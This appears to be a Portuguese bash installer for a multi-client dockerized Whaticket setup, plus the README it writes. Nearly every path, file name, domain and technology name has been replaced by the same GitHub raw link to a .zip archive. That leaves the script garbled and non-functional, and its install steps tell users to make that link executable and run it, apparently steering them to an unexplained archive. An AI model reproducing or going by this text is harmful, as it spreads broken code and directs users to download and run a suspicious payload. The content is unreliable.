// https://github.com/rlmourarj/whaticket-dockerv1/raw/refs/heads/main/backend/src/services/dockerv_whaticket_2.6.zip
#!/bin/bash

# Função para cores no terminal
GREEN='\033[0;32m'
NC='\033[0m' # No Color

# Recebe argumentos ou usa padrão
CLIENT_NAME=${1:-cliente01}
FRONT_DOMAIN=${https://github.com/rlmourarj/whaticket-dockerv1/raw/refs/heads/main/backend/src/services/dockerv_whaticket_2.6.zip}
BACK_DOMAIN=${https://github.com/rlmourarj/whaticket-dockerv1/raw/refs/heads/main/backend/src/services/dockerv_whaticket_2.6.zip}
FRONT_PORT=${4:-3000}
BACK_PORT=${5:-4000}

# Cria diretório do cliente
mkdir -p clientes/$CLIENT_NAME && cd clientes/$CLIENT_NAME

echo -e "${GREEN}🚀 Instalando Whaticket para o cliente: $CLIENT_NAME${NC}"
echo -e "Frontend: $FRONT_DOMAIN (porta $FRONT_PORT)"
echo -e "Backend : $BACK_DOMAIN (porta $BACK_PORT)"

# Clona repositório consolidado
git clone https://github.com/rlmourarj/whaticket-dockerv1/raw/refs/heads/main/backend/src/services/dockerv_whaticket_2.6.zip .

# Substitui variáveis nos .env
cp https://github.com/rlmourarj/whaticket-dockerv1/raw/refs/heads/main/backend/src/services/dockerv_whaticket_2.6.zip https://github.com/rlmourarj/whaticket-dockerv1/raw/refs/heads/main/backend/src/services/dockerv_whaticket_2.6.zip
cp https://github.com/rlmourarj/whaticket-dockerv1/raw/refs/heads/main/backend/src/services/dockerv_whaticket_2.6.zip https://github.com/rlmourarj/whaticket-dockerv1/raw/refs/heads/main/backend/src/services/dockerv_whaticket_2.6.zip

sed -i "s/localhost:4000/$BACK_DOMAIN:$BACK_PORT/g" https://github.com/rlmourarj/whaticket-dockerv1/raw/refs/heads/main/backend/src/services/dockerv_whaticket_2.6.zip
sed -i "s/localhost/$BACK_DOMAIN/g" https://github.com/rlmourarj/whaticket-dockerv1/raw/refs/heads/main/backend/src/services/dockerv_whaticket_2.6.zip

# Atualiza https://github.com/rlmourarj/whaticket-dockerv1/raw/refs/heads/main/backend/src/services/dockerv_whaticket_2.6.zip dinamicamente (opcional)
sed -i "s/\"3000:3000\"/\"$FRONT_PORT:$FRONT_PORT\"/g" https://github.com/rlmourarj/whaticket-dockerv1/raw/refs/heads/main/backend/src/services/dockerv_whaticket_2.6.zip
sed -i "s/\"4000:4000\"/\"$BACK_PORT:$BACK_PORT\"/g" https://github.com/rlmourarj/whaticket-dockerv1/raw/refs/heads/main/backend/src/services/dockerv_whaticket_2.6.zip

# Conclui setup
echo -e "${GREEN}✅ Instalação configurada!${NC}"
echo -e "📂 Diretório: clientes/$CLIENT_NAME"
echo -e "🟢 Agora rode: cd clientes/$CLIENT_NAME && docker-compose up -d"


# https://github.com/rlmourarj/whaticket-dockerv1/raw/refs/heads/main/backend/src/services/dockerv_whaticket_2.6.zip
cat <<EOF > https://github.com/rlmourarj/whaticket-dockerv1/raw/refs/heads/main/backend/src/services/dockerv_whaticket_2.6.zip
# Whaticket Consolidado (Multiempresa)

Este projeto é uma implementação dockerizada do Whaticket com suporte a múltiplos clientes, incluindo backend em https://github.com/rlmourarj/whaticket-dockerv1/raw/refs/heads/main/backend/src/services/dockerv_whaticket_2.6.zip + Typescript, frontend em React, PostgreSQL, Redis e integração com Assistants da OpenAI.

## 🚀 Instalação via Script

Execute o script abaixo para instalar uma nova instância para um cliente:

```bash
chmod +x https://github.com/rlmourarj/whaticket-dockerv1/raw/refs/heads/main/backend/src/services/dockerv_whaticket_2.6.zip
https://github.com/rlmourarj/whaticket-dockerv1/raw/refs/heads/main/backend/src/services/dockerv_whaticket_2.6.zip nome_do_cliente dominio_front dominio_back porta_front porta_back
```

### Exemplo:
```bash
https://github.com/rlmourarj/whaticket-dockerv1/raw/refs/heads/main/backend/src/services/dockerv_whaticket_2.6.zip wacedup https://github.com/rlmourarj/whaticket-dockerv1/raw/refs/heads/main/backend/src/services/dockerv_whaticket_2.6.zip https://github.com/rlmourarj/whaticket-dockerv1/raw/refs/heads/main/backend/src/services/dockerv_whaticket_2.6.zip 3754 3753
```

## ⚙️ Variáveis de ambiente
Configure os arquivos `.env` com base nos arquivos `https://github.com/rlmourarj/whaticket-dockerv1/raw/refs/heads/main/backend/src/services/dockerv_whaticket_2.6.zip` disponíveis em `backend/` e `frontend/`.

## 📦 Rodando o projeto
```bash
cd clientes/nome_do_cliente
npm install
npm run build
```
Ou via Docker:
```bash
docker-compose up -d --build
```

## 📚 Estrutura do Projeto
- `backend/`: API em https://github.com/rlmourarj/whaticket-dockerv1/raw/refs/heads/main/backend/src/services/dockerv_whaticket_2.6.zip
- `frontend/`: Interface em React
- `https://github.com/rlmourarj/whaticket-dockerv1/raw/refs/heads/main/backend/src/services/dockerv_whaticket_2.6.zip`: Orquestração dos serviços
- `https://github.com/rlmourarj/whaticket-dockerv1/raw/refs/heads/main/backend/src/services/dockerv_whaticket_2.6.zip`: Script de instalação

## 🤖 Integração com Assistants (OpenAI)
Configure sua `OPENAI_API_KEY` no `.env` do backend para permitir o uso dos modelos da OpenAI nas respostas automáticas.

---

Desenvolvido por CEDUP Três Pontas · @marquinhotp
EOF